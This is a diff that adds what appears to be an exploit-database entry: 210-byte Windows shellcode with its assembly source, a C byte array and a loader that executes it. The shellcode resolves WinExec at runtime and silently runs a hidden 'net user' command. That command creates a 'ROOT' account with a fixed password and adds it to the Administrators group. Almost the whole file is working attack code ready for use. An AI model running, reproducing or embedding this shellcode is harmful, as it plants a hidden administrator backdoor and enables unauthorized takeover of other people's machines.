@@ -1,0 +1,127 @@
+## Exploit Title: Windows/x64 - WinExec Add-Admin Dynamic Null-Free Shellcode (210 Bytes)
+## Exploit Author: Bobby Cooke
+## Date: 2020-03-21
+## Tested on:   Windows 10 Home - 1909 (x86_64), Windows 10 Pro - 1909 (x86)
+## Description: Windows Shellcode that adds the user 'ROOT' with the password 'I@mR00T$' to the system. The user 'ROOT' is then added to the localgroup 'Administrators'.
+
+get_kernel32_address:
+xor eax, eax
+mov eax, [fs:eax+0x30] ; EAX = &PEB
+mov eax, [eax+0xC]     ; EAX = &LDR
+mov esi, [eax+0x1C]    ; ESI = 1st entry InitOrderList - ntdll.dll
+lodsd                  ; EAX = 2nd entry InitOrderList - kernelbase.dll
+xchg esi, eax
+lodsd                  ; EAX = 3rd entry InitOrderList - kernel32.dll
+mov eax, [eax+0x8]     ; EAX = &Kernel32.dll
+push eax
+
+get_kernel32_export_table:
+mov ebx, [eax+0x3C] ; EBX = RVA NewEXEHeader
+add ebx, eax        ; EBX = &NewEXEHeader
+mov ebx, [ebx+0x78] ; EBX = RVA ExportTable
+add ebx, eax        ; EBX = &ExportTable
+
+get_export_name_table:
+mov edx, [ebx+0x20] ; EDX = RVA ExportNameTable
+add edx, eax        ; EDX = &ExportNameTable
+
+get_export_ordinal_table:
+mov ecx, [ebx+0x24] ; ECX = RVA ExportOrdinalTable
+add ecx, eax        ; ECX = &ExportOrdinalTable
+push ecx
+
+get_export_addr_table:
+mov edi, [ebx+0x1C] ; EDI = RVA ExportAddrTable
+add edi, eax        ; EDI = &ExportAddrTable
+push edi
+
+WinExec_String:
+push 0x456E6957 ; EniW
+
+counter_init:
+xor eax, eax    ; EAX = Counter
+
+searchLoop:
+mov edi, edx    ; EDI = &ExportNameTable
+mov esi, esp    ; ESI = "WinE"
+xor ecx, ecx
+cld                  ; Process strings left to right
+mov edi, [edi+eax*4] ; EDI = RVA NthNameString
+add edi, [esp+0xC]   ; EDI = &NthNameString
+add cx, 0x4          ; ECX = len("WinE")
+repe cmpsb           ; compare [&NthNameString] to "WinExec"
+jz found             ; If [&NthNameString] == "WinExec" end loop
+inc eax              ; Counter ++
+jmp short searchLoop ; restart loop
+
+found:
+mov ecx, [esp+0x8]     ; ECX = &ExportOrdinalTable
+mov ax,  [ecx + eax*2] ;  AX = ordinalNumber
+mov edx, [esp+0x4]     ; EDX = &ExportAddrTable
+mov ebx, [edx + eax*4] ; EBX = RVA WinExec
+add ebx, [esp+0xC]     ; EBX = &WinExec
+
+add_user:
+; Call WinExec( CmdLine, ShowState );
+; $CmdLine = 'cmd.exe /c net user ROOT I@mR00T$ /ADD && net localgroup Administrators ROOT /ADD'
+; $ShowState = SW_HIDE  
+xor ecx, ecx
+mul ecx
+mov al, 0x44    ; D : 44
+push eax
+push 0x44412f20 ; DA/  
+push 0x544f4f52 ; TOOR 
+push 0x2073726f ;  sro 
+push 0x74617274 ; tart 
+push 0x73696e69 ; sini 
+push 0x6d644120 ; mdA  
+push 0x70756f72 ; puor 
+push 0x676c6163 ; glac 
+push 0x6f6c2074 ; ol t 
+push 0x656e2026 ; en & 
+push 0x26204444 ; & DD 
+push 0x412f2024 ; A/ $ 
+push 0x54303052 ; T00R 
+push 0x6d404920 ; m@I  
+push 0x544f4f52 ; TOOR 
+push 0x20726573 ;  res 
+push 0x75207465 ; u te 
+push 0x6e20632f ; n c/ 
+push 0x20657865 ;  exe 
+push 0x2e646d63 ; .dmc 
+mov eax, esp    ; EAX = &CmdLine
+push ecx        ; $ShowState 
+push eax        ; $CmdLine
+call ebx        ; Call the WinExec Function
+
+###############################################
+
+#include <windows.h>
+#include <stdio.h>
+
+char code[] = \
+"\x31\xc0\x64\x8b\x40\x30\x8b\x40\x0c\x8b\x70\x1c"
+"\xad\x96\xad\x8b\x40\x08\x50\x8b\x58\x3c\x01\xc3"
+"\x8b\x5b\x78\x01\xc3\x8b\x53\x20\x01\xc2\x8b\x4b"
+"\x24\x01\xc1\x51\x8b\x7b\x1c\x01\xc7\x57\x68\x57"
+"\x69\x6e\x45\x31\xc0\x89\xd7\x89\xe6\x31\xc9\xfc"
+"\x8b\x3c\x87\x03\x7c\x24\x0c\x66\x83\xc1\x04\xf3"
+"\xa6\x74\x03\x40\xeb\xe7\x8b\x4c\x24\x08\x66\x8b"
+"\x04\x41\x8b\x54\x24\x04\x8b\x1c\x82\x03\x5c\x24"
+"\x0c\x31\xc9\xf7\xe1\xb0\x44\x50\x68\x20\x2f\x41"
+"\x44\x68\x52\x4f\x4f\x54\x68\x6f\x72\x73\x20\x68"
+"\x74\x72\x61\x74\x68\x69\x6e\x69\x73\x68\x20\x41"
+"\x64\x6d\x68\x72\x6f\x75\x70\x68\x63\x61\x6c\x67"
+"\x68\x74\x20\x6c\x6f\x68\x26\x20\x6e\x65\x68\x44"
+"\x44\x20\x26\x68\x24\x20\x2f\x41\x68\x52\x30\x30"
+"\x54\x68\x20\x49\x40\x6d\x68\x52\x4f\x4f\x54\x68"
+"\x73\x65\x72\x20\x68\x65\x74\x20\x75\x68\x2f\x63"
+"\x20\x6e\x68\x65\x78\x65\x20\x68\x63\x6d\x64\x2e"
+"\x89\xe0\x51\x50\xff\xd3";
+
+int main(int argc, char **argv)
+{
+  int (*func)();
+  func = (int(*)()) code;
+  (int)(*func)();
+}
